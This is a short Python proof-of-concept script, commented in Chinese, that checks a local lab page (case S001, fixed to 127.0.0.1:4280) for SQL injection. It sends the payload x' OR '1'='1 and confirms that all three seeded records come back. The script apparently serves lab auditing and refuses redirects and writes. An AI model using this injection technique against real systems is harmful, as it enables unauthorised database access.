#!/usr/bin/env python3
# S001 SQL 注入本地验证脚本：仅允许固定目标 127.0.0.1:4280，不修改数据。
import html
import re
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280"
PATH = "/lab_cases/S001/index.php"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise RuntimeError(f"拒绝重定向: HTTP {code} -> {newurl}")

def fetch_records(name):
    url = BASE + PATH + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(req, timeout=5) as resp:
            if resp.geturl() != url:
                raise RuntimeError(f"最终 URL 不是固定目标: {resp.geturl()}")
            body = resp.read().decode("utf-8", "replace")
    except Exception as exc:
        raise RuntimeError(f"请求失败: {url}; {exc}") from exc

    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
    records = []
    for match in pattern.finditer(body):
        records.append((match.group(1), html.unescape(match.group(2)).strip()))
    return records

def main():
    normal_name = "Alice"
    test_name = "x' OR '1'='1"

    normal_records = fetch_records(normal_name)
    test_records = fetch_records(test_name)

    expected_normal = [("1", "Alice")]
    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

    print("普通对照记录:", normal_records)
    print("测试输入记录:", test_records)

    if normal_records != expected_normal:
        print("普通对照失败：预期仅 (1,Alice)。请检查入口、$db 连接、lab_people 初始化和查询错误页。")
        return 1

    if len(test_records) != 3 or set(test_records) != expected_test:
        print("测试未达到预期：预期测试输入返回全部三条预置记录，普通输入仅返回 Alice。")
        print("失败需检查数据库初始化、连接状态、页面路径及是否出现查询失败。")
        return 1

    print("POC成功：普通输入仅返回 Alice；测试输入使查询返回 Alice、Bob、Carol 三条记录。")
    print("注意：该脚本只读验证，不修改数据库记录。")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
